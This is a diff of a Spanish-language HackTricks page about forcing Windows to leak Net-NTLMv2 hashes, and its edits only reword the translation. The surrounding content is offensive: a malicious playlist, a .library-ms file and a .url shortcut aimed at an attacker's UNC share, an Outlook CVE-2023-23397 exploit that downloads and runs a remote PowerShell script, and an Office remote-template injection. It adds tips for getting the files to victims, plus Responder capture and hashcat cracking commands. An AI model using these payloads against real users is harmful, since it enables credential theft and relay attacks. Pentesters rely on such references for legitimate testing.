@@ -2,12 +2,12 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**Consulta todas las grandes ideas de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) desde la descarga de un archivo Microsoft Word en línea hasta la fuente de ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md y [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**
+**Consulta todas las ideas geniales de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — desde la descarga de un microsoft word file online hasta la ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md y [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**
 
 
-### Windows Media Player playlists (.ASX/.WAX)
+### Listas de reproducción de Windows Media Player (.ASX/.WAX)
 
-Si puedes lograr que un objetivo abra o previsualice una Windows Media Player playlist que controlas, puedes leak Net‑NTLMv2 apuntando la entrada a una UNC path. WMP intentará obtener el media referenciado vía SMB y se autenticará implícitamente.
+Si puedes lograr que un objetivo abra o previsualice una playlist de Windows Media Player que controles, puedes leak Net‑NTLMv2 apuntando la entrada a una ruta UNC. WMP intentará obtener el medio referenciado a través de SMB y se autenticará implícitamente.
 
 Ejemplo de payload:
 ```xml
@@ -27,11 +27,11 @@ sudo Responder -I <iface>
 # Crack the captured NetNTLMv2
 hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
 ```
-### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)
+### .library-ms incrustado en ZIP NTLM leak (CVE-2025-24071/24055)
 
-El Explorador de Windows maneja de forma insegura los archivos .library-ms cuando se abren directamente desde un archivo ZIP. Si la definición de la biblioteca apunta a una ruta UNC remota (p. ej., \\attacker\share), simplemente navegar/abrir el .library-ms dentro del ZIP hace que el Explorador enumere la UNC y emita autenticación NTLM al atacante. Esto genera un NetNTLMv2 que puede ser crackeado offline o potencialmente relayed.
+Windows Explorer maneja de forma insegura los archivos .library-ms cuando se abren directamente desde un archivo ZIP. Si la definición de la library apunta a una ruta UNC remota (p. ej., \\attacker\share), simplemente examinar/abrir el .library-ms dentro del ZIP hace que Explorer enumere la UNC y envíe autenticación NTLM al atacante. Esto genera un NetNTLMv2 que puede ser crackeado sin conexión o, potencialmente, relayed.
 
-Minimal .library-ms pointing to an attacker UNC
+Ejemplo mínimo de .library-ms que apunta a una ruta UNC del atacante
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
@@ -57,11 +57,11 @@ Operational steps
 - Run an NTLM capture listener and wait for the victim to open the .library-ms from inside the ZIP.
 
 
-### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak
+### Ruta de sonido del recordatorio del calendario de Outlook (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak
 
-Microsoft Outlook for Windows procesaba la propiedad MAPI extendida PidLidReminderFileParameter en los elementos del calendario. Si esa propiedad apunta a una ruta UNC (por ejemplo, \\attacker\share\alert.wav), Outlook contactaría la share SMB cuando se active el recordatorio, leakando el Net‑NTLMv2 del usuario sin ningún click. Esto se parcheó el 14 de marzo de 2023, pero sigue siendo muy relevante para flotas legacy/inalteradas y para la respuesta a incidentes histórica.
+Microsoft Outlook for Windows procesaba la propiedad extendida MAPI PidLidReminderFileParameter en los elementos del calendario. Si esa propiedad apuntaba a una ruta UNC (por ejemplo, \\attacker\share\alert.wav), Outlook contactaba la SMB share cuando se activaba el recordatorio, leaking the user’s Net‑NTLMv2 sin necesidad de hacer clic. Esto se parchó el 14 de marzo de 2023, pero sigue siendo muy relevante para flotas heredadas/no actualizadas y para la respuesta a incidentes histórica.
 
-Quick exploitation with PowerShell (Outlook COM):
+Explotación rápida con PowerShell (Outlook COM):
 ```powershell
 # Run on a host with Outlook installed and a configured mailbox
 IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
@@ -73,13 +73,13 @@ Lado del Listener:
 sudo responder -I eth0  # or impacket-smbserver to observe connections
 ```
 Notas
-- Una víctima solo necesita tener Outlook for Windows en ejecución cuando se activa el recordatorio.
-- El leak proporciona Net‑NTLMv2 adecuado para offline cracking o relay (no pass‑the‑hash).
+- La víctima solo necesita Outlook for Windows en ejecución cuando se activa el recordatorio.
+- El leak produce Net‑NTLMv2 adecuado para offline cracking o relay (no pass‑the‑hash).
 
 
-### .LNK/.URL basado en iconos zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)
+### .LNK/.URL basado en iconos zero‑click NTLM leak (CVE‑2025‑50154 – elusión de CVE‑2025‑24054)
 
-Windows Explorer renderiza automáticamente los iconos de los accesos directos. Investigaciones recientes mostraron que incluso después del parche de Microsoft de abril de 2025 para atajos UNC‑icon, todavía era posible desencadenar autenticación NTLM sin hacer clic alojando el objetivo del acceso directo en una ruta UNC y manteniendo el icono local (patch bypass asignado CVE‑2025‑50154). Simplemente ver la carpeta hace que Explorer recupere metadatos del objetivo remoto, emitiendo NTLM al servidor SMB del atacante.
+Windows Explorer muestra automáticamente los íconos de atajos. Investigaciones recientes mostraron que incluso después del parche de Microsoft de abril de 2025 para accesos directos con icono UNC, aún era posible desencadenar NTLM authentication sin clics alojando el destino del acceso directo en una ruta UNC y manteniendo el icono local (elusión del parche asignada CVE‑2025‑50154). Simplemente ver la carpeta hace que Explorer recupere metadatos del destino remoto, emitiendo NTLM al servidor SMB del atacante.
 
 Payload mínimo de Internet Shortcut (.url):
 ```ini
@@ -98,16 +98,16 @@ $sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass U
 $sc.Save()
 ```
 Ideas de entrega
-- Coloca el acceso directo en un ZIP y consigue que la víctima lo explore.
+- Coloca el acceso directo en un ZIP y haz que la víctima lo explore.
 - Coloca el acceso directo en un recurso compartido con permisos de escritura que la víctima abrirá.
-- Combínalo con otros archivos de cebo en la misma carpeta para que Explorer previsualice los elementos.
+- Combínalo con otros archivos señuelo en la misma carpeta para que Explorer previsualice los elementos.
 
 
-### Office remote template injection (.docx/.dotm) to coerce NTLM
+### Inyección de plantilla remota de Office (.docx/.dotm) para forzar NTLM
 
-Los documentos Office pueden referenciar una plantilla externa. Si configuras la plantilla adjunta a una ruta UNC, al abrir el documento se autenticará con SMB.
+Los documentos de Office pueden referenciar una plantilla externa. Si configuras la plantilla adjunta a una ruta UNC, al abrir el documento se autenticará ante SMB.
 
-Minimal DOCX relationship changes (inside word/):
+Cambios mínimos en las relaciones de DOCX (dentro de word/):
 
 1) Edita word/settings.xml y añade la referencia a la plantilla adjunta:
 ```xml
@@ -117,7 +117,7 @@ Minimal DOCX relationship changes (inside word/):
 ```xml
 <Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
 ```
-3) Reempaqueta a .docx y entrégalo. Ejecuta tu SMB capture listener y espera la apertura.
+3) Reempaqueta a .docx y entrégalo. Ejecuta tu SMB capture listener y espera a que se abra.
 
 Para ideas posteriores a la captura sobre relaying o abuso de NTLM, consulta:
 
